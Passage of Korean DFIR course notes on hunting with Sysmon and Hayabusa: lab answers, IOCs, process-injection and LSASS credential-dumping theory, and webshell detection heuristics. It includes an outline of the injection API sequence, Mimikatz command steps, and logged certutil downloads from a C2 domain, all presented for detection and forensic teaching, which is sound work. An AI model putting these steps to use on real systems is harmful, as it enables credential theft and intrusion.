		"Excel Nework Connections" -> 엑셀 프로그램이 사설 네트워크 or localhost가 아닌 원격 네트워크 접속 시도 흔적 탐지
		"Powershell Network Connections" -> 파워쉘 프로그램이 사설네트워크가 아니거나 혹은 MS에서 사용하는 네트워크가 아닌 곳에 네트워크 접속 시도 흔적 탐지
										(본 룰의 경우 만약 공격자가 로컬 네트워크를 점유해서 C2/악성코드 유포로 사용할 경우가 있다면 헌팅 실패할 수도 있음)
		"Suspicious Program location.." -> 일반적으로 프로그램이 실행되지 않은 경로 목록에 포함되어 있고, 해당 프로그램들이 네트워크 접속 시도 흔적 탐지

	C:> hayabusa csv-timeline -r E:\DFIR\hayausa\rules\sigma\sysmon\network_connection -d .\myevents -C -o anormal_network_result.csv

	Q. 수집된 이벤트 로그를 조사하여 비정상적인 통신이 발견된 시스템은 무엇입니까?
	HINT. Timeline Explorer 툴을 이용하여 그룹을 만들 때 "Computer" 컬럼을 우선으로 합니다.
	A. 총 2대 에서 이상징후가 발견 되었습니다. "DESKTOP-9SCSJHC", "MSEDGEWIN10"

	Q. 각 시스템에서는 어떠한 비정상적인 네트워크 활동이 발생했었나요?
	A. 	"DESKTOP-9SCSJHC" 에서
			LOLBinary 중 하나인 powershell.exe 프로세스가 원격 시스템(<외부IP>)과 통신을 수행한 흔적이 발견 되었습니다.
			비정상적인 경로에서 실행되는 C:\Users\public\up.exe 프로세스가 원격 시스템(<외부IP>)과 통신을 수행한 흔적이 발견 되었습니다.

			<외부IP> (피해단말, powershell.exe) 	<---- TCP ----> <외부IP>:80 (악성서버)
			<외부IP> (피해단말, up.exe) 			<---- TCP ---->	<외부IP>:443 (악성서버)

		"MSEDGEWIN10" 에서 이하 LOL Binary 들이 원격 시스템(151.101.0.133) 시스템과 통신을 수행한 흔적이 발견 되었습니다.
			powershell.exe, regsvr32.exe, rundll32.exe certutil.exe 등의 LOL Binary가 악용됨.

			10.0.2.15 (피해단말, OOO.exe)	<---- TCP ----> 151.101.0.133:443 (악성서버)

	IOC(Indicator Of Compromised, 침해사고 지표)
		공격자의 시스템 정보
			<외부IP>:80
			151.101.0.133:443
		악성파일 정보
			C:\Users\public\up.exe
}
```

Event ID 1

Process의 생성

어떤 프로그램이 실행되는가
```plain text
+ 이론. 윈도우 운영체제의 IL(Integrity Level), Privilege {
	IL: 프로세스가 가지는 권한행사 수준(level), 비유하자면 사원-대리-과장-부장-이사와 같은 직급수준 이라고 보시면 됩니다.
		낮은 IL을 가진 프로세스는 자기보다 높은 IL을 가진 프로세스에 접근하거나 권한을 행사할 수 없습니다.
			MalwareA Process(IL Medium) --- 메모리에 접근하여 ID/PASS 탈취 시도 (실패) ---> LSASS.EXE(IL System)
			MalwareA Process(IL Untrusted) --- 크리덴셜 정보를 가진 파일 접근 시도 (실패) ---> id.xlsx(IL Medium)
		https://redcanary.com/blog/threat-detection/better-know-a-data-source/process-integrity-levels/

	Privilege: 프로세스가 수행할 수 있는 역할. 비유하자면 R&R

}
```

> 📷 MITRE ATT&CK T1055 Process Injection: 다른 프로세스 주소 공간에서 코드를 실행해 탐지를 피하고 권한을 높이는 기법. 하위 기법 12개, 전술은 Defense Evasion·Privilege Escalation, 플랫폼 Linux/Windows/macOS.

### Injection

A (공격프로세서)가 B(타켓프로세스)의 메모리 공간에 코드를 삽압하여 실행하는 기술

대부분 exploer와 같은 성질을 같은 파일에 인젝션시킴

explorer.exe.인 유는 사용자 세선 내내 항상 실행되어 있으머, 네트워크 통신이나 파일에 접근이 빈번해도 의심을 덜 받기 때문이다.

실행방식 - virtualallocex메모리할당 → wirte process 코드삽임 → createremotethred 스레드실행

이를 통해 공격자는 자신의 악성 프로세스를 슴기고., 해당 프로세스의 권한을 그대로 이용한다.

윈도우는 프로세스 간의 간섭을 막기 위해

- IL(Intergrity Level) ≥ 가 같거나 작아야한다.  * 닞은 권한의 프로세서가 높은 권한의 프로세스에 영향을 주지 못하게 한다.
  - 인터넷 브라우저는 보통 Low IL, 관리자 실행은 High/System IL
- Sedebug privilege -*다른 프로세서의 메모리를 디버깅 할 수 있는 권한*, 인젝션을 하거나 lsass.exe  같은 시스템 프로세스에 접근하려면 반드시 이 권한이 활성된 관리자 수준의 토큰이 필요하다.
  - 아레날를 갖기 위해 한 프로그램에 대한 다른 프로그램의 sedug privilge를 갖고 있어야한다.

lsass - 로그인 정보는 입력하면 해쉬값이 바뀌어=  win32 config SAM 이 쉐도우 라이크 파일과 대조한다, 그러면 메모리에 흔적이 남겨져있다. LSALSS는 관리자 권한
```text
LSASS와 자격 증명 메커니즘
lsass.exe(Local Security Authority Subsystem Service)는 윈도우의 보안 정책을 강제하고 로그인을 처리하는 핵심 프로세스입니다.

인증 과정: 사용자가 비밀번호를 입력하면 시스템은 이를 해시값으로 변환하여 SAM(Security Accounts Manager) 파일이나 Active Directory와 대조합니다.

메모리 흔적: 사용자가 로그인에 성공하면, 이후 서비스 이용 편의를 위해 lsass.exe의 메모리 공간에 NTLM 해시나 Kerberos 티켓 같은 자격 증명 정보가 남게 됩니다.

공격 시나리오: 관리자 권한(SeDebugPrivilege)을 획득한 공격자는 Mimikatz 같은 도구를 이용해 lsass.exe의 메모리를 덤프(Dump)하여, 저장된 해시값을 탈취(Pass-the-Hash 공격 등)합니다.
```

정리하신 "MIMIC CARTS(Mimikatz)"가 메모리에 남겨진 정보를 덤프하는 과정과 그 위험성을 조금 더 구체적으로 보완해 드릴게요.

#### 1. Mimikatz의 역할: 메모리 사냥꾼

사용자가 윈도우에 로그인하면, 시스템은 매번 비밀번호를 물어보지 않기 위해 LSASS(lsass.exe) 프로세스의 메모리 안에 인증 정보를 보관합니다.

- 덤프(Dump)란?: 메모리에 올라와 있는 데이터를 파일 형태(.dmp)로 복사해 내는 것을 말합니다.
- 추출 데이터: 단순히 로그 정보뿐만 아니라, NTLM 해시, Kerberos 티켓, 심지어 설정에 따라서는 **평문 비밀번호(Cleartext Password)**까지도 추출할 수 있습니다.

#### 2. 공격의 메커니즘 (작동 원리)

공격자가 관리자 권한을 얻은 후 Mimikatz를 실행하면 다음과 같은 단계가 진행됩니다.

1. Privilege::Debug: 앞서 말씀하신 SeDebugPrivilege 권한을 활성화하여 시스템 프로세스인 LSASS에 접근할 권리를 얻습니다.
1. Sekurlsa::Logonpasswords: LSASS 메모리 영역을 스캔하여 현재 로그인된 사용자의 암호화된 자격 증명을 찾아냅니다.
1. 복호화: 메모리 내의 특정 암호화 키를 찾아내어 해시나 평문 정보를 읽기 가능한 형태로 화면에 뿌려줍니다.

#### 3. 왜 위험한가? (공격의 확장)

메모리 덤프가 무서운 이유는 단순히 한 대의 PC가 뚫리는 것에 그치지 않기 때문입니다.

- Pass-the-Hash (PtH): 비밀번호를 몰라도 추출한 해시(Hash) 값만 있으면 네트워크상의 다른 서버나 PC에 바로 로그인할 수 있습니다.
- Lateral Movement (측면 이동): 한 명의 관리자 계정이 덤프되면, 그 권한을 이용해 기업 내부 망의 모든 컴퓨터로 공격을 확산시킬 수 있습니다.

#### 4. 방어 체계 (LSA Protection)

최신 윈도우에서는 이를 막기 위해 여러 방어책을 사용합니다.

- PPL (Protected Process Light): LSASS를 보호된 프로세스로 설정하여, 설령 관리자 권한이라도 외부 프로세스가 메모리를 함부로 읽지 못하게 차단합니다 (RunAsPPL).
- Credential Guard: 가상화 기술(VBS)을 이용해 자격 증명 정보를 별도의 격리된 공간에 저장하여, OS가 뚫려도 메모리 덤프를 원천적으로 방지합니다.

공격자가 인젝션을 통해 침투하고, sedebugprivilege로 구너한을 높인뒤. mimilatx

https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
```plain text
# 교재 115페이지 참조

	Handle = OpenProcess(PID)
	Address = VirtualAllocEx(Handle, Size)
	WriteProcessMemory(Handle, Address, pBuffer) 
	CreateRemoteThread -실행의 기본던위는 쓰레드고 지금 여러개의 쓰레드가 있지만 쓰도록안되어었기때문에 다시 함수 동작을 위해 새로운 쓰레드가 필요하다. 
```

> 📷 Sysmon 문서: 이벤트 ID 6(드라이버 로드), 7(이미지 로드, 기본 비활성), 8(CreateRemoteThread — 다른 프로세스에 스레드 생성, 코드 인젝션 탐지에 사용), 9(RawAccessRead — `\.\`로 드라이브 직접 읽기).
```plain text
+ 실습. 프로세스 인젝션 이벤트 탐지 실습 (~14:20) {
	미션. SYSMON 이벤트로그 ID 8은 다음과 같이 정의하고 있습니다.
		"The CreateRemoteThread event detects when a process creates a thread in another process.
		This technique is used by malware to inject code and hide in other processes.
		The event indicates the source and target process.
		It gives information on the code that will be run in the new thread: StartAddress, StartModule and StartFunction.
		Note that StartModule and StartFunction fields are inferred, they might be empty if the starting address is outside loaded modules or known exported functions."

		다음 수집된 SYSMON 이벤트로그들을 조사하여 프로세스 인젝션을 탐지 하세요.

		Q1. 프로세스 인젝션 징후가 보이는 단말의 이름과 개수는?
		A.	"DESKTOP-9SCSJHC", "DESKTOP-PIU87N6" , "IEWIN7", "DESKTOP-DKQAQ33"

		Q2. 프로세스 인젝션 내용을 분석하여 다음 정보를 확인하세요.
			프로세스 인젝션을 수행한 주체?,	프로세스 인젝션 당한 객체?,	프로세스 인젝션 시간?, 프로세스 인젝션 주체의 IL(Integrity Level)
		A.
			"DESKTOP-9SCSJHC"
				2021.11.10 17:32:15
					C:\Users\user03\AppData\Local\Temp\conhost.exe(IL "system") -> C:\Windows\System32\winlogon.exe (IL "system")

			"DESKTOP-PIU87N6"
				2020.09.28 21:47:36
					C:\Windows\System32\rdrleakdiag.exe (IL "system") -> C:\Windows\System32\lsass.exe (IL "system")

			"IEWIN7"
				2019.05.26 13:01:43
					C:\Users\IEuser\Desktop\info.rar\jjs.exe(PID 3884, IL "system") -> C:\Windows\System32\svchost.exe(PID 3908, IL "system")

		해석.
			세 개의 시스템 모두 실행되 프로세스 모두 윈도우의 빌트인 프로세스가 아니며, 경로 정보도 일반적이지 않습니다.
			또한 무결성 수준이 "system"인 상태로 실행된 것으로 보아 모두 관리자 수준 이상의 권한을 탈취한 것으로 보입니다.
			"DESKTOP-PIU87N6" 시스템의 경우 인젝션 대상이 lsass.exe 인 것으로 보아 크리덴셜 정보를 탈취하려는 의도로 추정됩니다. 권한 상승

		참조.
			LSASS 프로세스의 크리덴셜 접근 관련 -> https://archives.pass-the-salt.org/RMLL%20Security%20Tracks/2014/slides/RMLL-Sec-2014-Mimikatz_a_short_journey_inside_the_memory_of_the_Windows_Security_service.pdf

	--- ProcessInjection.yml -----------------------------------------------------------
			.. 내용 유사 하므로 생략 ..

	detection:
	  process_injection:
	    EventID: 8
	  condition: process_injection

	falsepositives: unknown
	level: high
	-------------------------------------------------------------------------------------

	C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv

}
```

윈도우 sysmon

lsass의 가상화로 아이디 탈취가 어려워짐

id

password

winlogon process

부팅이후에는 항상 살아있는 프로세서 lsass,,exe한테 자기가 받은 id password정보를 전달해주면  대칭키값으로 암호화 대칭키기반으로하고 복호키도 저장이되어있다.

sam이라는 스토리지와 비교를한다. 쉐도우파일과 비슷한 역활을하고 해시회된 패스워드 아이디가 있다.

> 📷 C:\Windows\System32\config 폴더: SAM, SECURITY, SOFTWARE, SYSTEM, DEFAULT 등 레지스트리 하이브 파일. SAM에 계정과 해시된 비밀번호가 저장된다(리눅스 shadow와 비슷한 역할).

만약에 rdr leakdiag.exe 이라는 프로세스가 인젝션을 함
```plain text
+ 실습. 다수의 시그마룰을 활용한 헌팅 실습 (~15:30) {
	# "DESKTOP-9SCSJHC(<외부IP>)" 에서 많은 위협 징후가 관찰 되었습니다.
	# 해당 단말에서 추출한 Windows-Operational-Sysmon-PC3.evtx 에서 집중 헌팅을 할 필요가 있습니다.
	# hayabusa 에서 기본 제공하는 SIGMA SYSMON 룰을 이용하여 위협을 식별해 보세요,
	# 그리고 결과를 분석하여 타임라인 기반으로 사건을 재구성 해보세요.

	C:> hayabusa csv-timeline -r E:\DFIR\hayabusa\rules\sigma\sysmon -f .\myevents\Windows-Operational-Sysmon-PC3.evtx -C -o PC3_hunting_result.csv

	Q1. 피해 시스템은 Spearphishing Attachment 공격을 통해 공격자에게 권한을 탈취 당했습니다. 공격에 사용된 악성 문서의 경로와 이름은 무엇입니까?
	A. "[개발팀]채용요청서.hwp"

	Q2. 피해 시스템이 통신한 외부의 공격자 서버(C2) 도메인(IP)는 무엇이며, 어떠한 프로세스가 통신 하였습니까?
	A. www.sparkdept.com (<외부IP>)

	Q3. 피해 시스템은 거점 시스템으로서 측면이동(Lateral Movement) 공격의 발판입니다. 추가로 피해가 발생한 시스템의 IP는 무엇입니까?
	A. <외부IP>

	TimeStamp		Event	Process				Description
	------------------------------------------------------------------------------------------------------
	2021.11.08
		15:11:08	파일열람	[hwp] 			한컴 오피스 프로그램을 이용하여 다운로드 폴더에 있는 "채용요청서.hwp" 열람
	2021.11.09
		12:05:59	파일열람	[hwp] 			한컴 오피스 프로그램을 이용하여 데스크탑 폴더에 있는 "~평균임금_공표~.hwp" 열람
	2021.11.10
		15:36:33	파일생성	[outlook] 		OUTLOOK.EXE를 통해 다운로드 폴더에 "[개발팀]채용요청서.hwp" 파일을 다운로드
		15:36:39	파일열람	[hwp] 			한컴 오피스 프로그램을 이용하여 다운로드 폴더에 있는 "[개발팀]채용요청서.hwp" 열람
		15:36:48	파일실행	[gswin32c] 		hwp.exe->gswin32c.exe, 포스트 스크립트 실행
		15:36:50	파일실행	[powershell]	gbb.exe->powershell.exe, 'http://www.sparkdept.com/Attach' 에서 스크립트 다운로드
		15:36:57	파일생성	[powershell]	powershell.exe->PCCleaner.exe, %AppData%\PCCleaner.exe 생성
		17:31:46	다운로드	[certutil] 		cmd.exe->certutil.exe, http://www.sparkdept.com/conhost.exe -> C:\Users\user03\AppData\Local\Temp\conhost.exe
		17:32:03	다운로드	[certutil] 		cmd.exe->certutil.exe, http://www.sparkdept.com/up.exe -> C:\Users\public\up.exe
		17:32:15	P인젝션		[conhost]		conhost.exe->winlogon.exe, 앞서 다운로드된 conhost.exe가 프로세스인젝션 수행
	2021.11.11
		13:01:06	파일열람	user03			한컴 오피스 프로그램을 이용하여 다운로드 폴더에 있는 "StandardLaborContract.hwp" 열람
	2021.11.12
		14:47:55	다운로드	[certutil]		cmd.exe->certutil.exe, http://www.sparkdept.com/Collector.exe -> C:\Users\user03\AppData\Local\Temp\Collector.exe
		14:57:29	다운로드	[certutil]		cmd.exe->certutil.exe, http://www.sparkdept.com/UpdateManager.exe -> C:\Users\user03\AppData\Local\Temp\UpdateManager.exe
	------------------------------------------------------------------------------------------------------

	[DESKTOP-9SCSJHC, <외부IP>]
	explorer.exe
		|- outlook.exe
			|- hwp.exe
				|- gswin32.exe
				|- gbb.exe
					|- powershell.exe -------- http 통신 --------- C2서버(www.sparkdept.com/Attach/)	# 스크립트 다운로드 및 실행
						|- PCCleaner.exe ----- http 통신 --------- C2서버(www.sparkdept.com/Attach/)	# PCCleaner 프로그램은 원격 쉘로 추정
							|- cmd.exe
								|- 다양한 명령어들1
								|- 다양한 명령어들2
								|- 다양한 명령어들N
								|- UpdateManager.exe --- 측면이동 공격(원격프로세스실행) ---->  <외부IP>/C:\Share Folder\tbjEA.exe

	!! 1차 분석 목표는 "IOC" 추출. IOC(Indicator Of Compromised)는 "침해사고 지표" 라고 해석되며 위협과 관련된 파일명, 경로, 도메인/IP, 해시값 등을 의미합니다.
	IOC#1. www.sparkdept.com, <외부IP>
	IOC#2. %AppData%\PCCleaner.exe
	IOC#3. C:\Users\public\up.exe
	IOC#4. %Temp%conhost.exe
	IOC#5. %Temp%Collector.exe
	IOC#6. %Temp%UpdateManager.exe
}
```
```plain text
+ 이론. 웹 기반 위협 사냥시 고려 해야할 이상징후 {
	+ 요청 헤더의 이상징후 확인 {
		징후1. GET, POST를 제외한 메써드가 사용 되지는 않았는가?
		징후2. User-Agent 헤더에 브라우저 스트링이 아닌 공격 도구가 사용하는 문자열이 포함되지는 않는가?
		징후3. 웹 루트를 제외한 Referer 헤더가 비어있는 URI 요청이 발생된 경우가 있는가?
		징후4. Content-Length 헤더의 값이 비정상적으로 큰 값이 설정되어 있지는 않는가?
	}

	+ 트래픽 통계 관점에서 이상징후를 확인 {
		징후1. 404 Not Found, 5XX Server Error 응답 메시지를 많이 발생시킨 클라이언트가 존재하는가? (스캐닝 가능성)
		징후2. 소수의 클라이언트만 접근한 URI가 존재 하는가? (웹쉘 URI 가능성)
			-> "소수의 클라이언트가 접근한 URI 요청에 Referer 헤더가 존재하지 않는 경우"를 찾으면 웹쉘을 발견하기 수월함
		징후3. 하나의 클라이언트에서 다수의 User-Agent 스트링을 사용하는 경우가 식별 되는가?
	}
}
```

user angent

3 way

http req

head - get post uri url(location)

a : b

c: d

content length  - body의 사이즈가 나온다
```plain text
+ 실습. 웹쉘 통신 흔적 식별 실습 - SCENARIO#7 {
    A. "Access.log" 파일을 이하 스크립트를 이용하여 "Access.csv"로 전환한 후 Timeline Explorer 혹은 Open Office 툴로 열람합니다.
	----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	import re

	with open('access_log', 'r') as file:
	  print('IP,TIME,METHOD,URI,RESP_STATUSCODE, RESP_SIZE,REFERER,USER-AGENT')
	  for line in file:
		match = re.search(r'(\d+\.\d+\.\d+\.\d+) \- \- \[(.+)\] "(GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH) (.+)( HTTP/1\..)?" (\d+) (\d+|\-) "(.+)" "(.+)"', line)
		if match:
		  ip_address = match.group(1)
		  requested_time = match.group(2)
		  requested_method = match.group(3)
		  requested_uri = match.group(4)
		  response_statuscode = match.group(6)
		  response_size = match.group(7)
		  referer = match.group(8)
		  user_agent = match.group(9)
		  print(f'{ip_address},{requested_time},{requested_method},{requested_uri},{response_statuscode},{response_size},{referer},{user_agent}')
	----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	$ python logtocsv.py > access_log.csv

	Timeline Exploer 툴을 이용하여 그룹핑을(Referer 헤더 기준) 하시면 헤더가 비어있는 그룹을 보실 수 있습니다.
	공격자로 추정되는 "16.0.0.14" 시스템을 확인할 수 있습니다.
}
```

refere head c에 위치해 있으면서 리퀘스터 자체의 페이지 출처를 알려주는 것

대부분의 경우 존재한다. 공격자가 webjail을 삽입함 이 경우 출처가 없이 리퍼럴헤드가 비어있는 상태로 된다.

웹쉘의 요청 흔적의 가능성이 높다.

통계기반의 anormallsm의 측면으로 보안이 접근해야한다.,

악성코드 탐지 정도는 ai가 하지만 ..

방어는 아직 못하고 있음
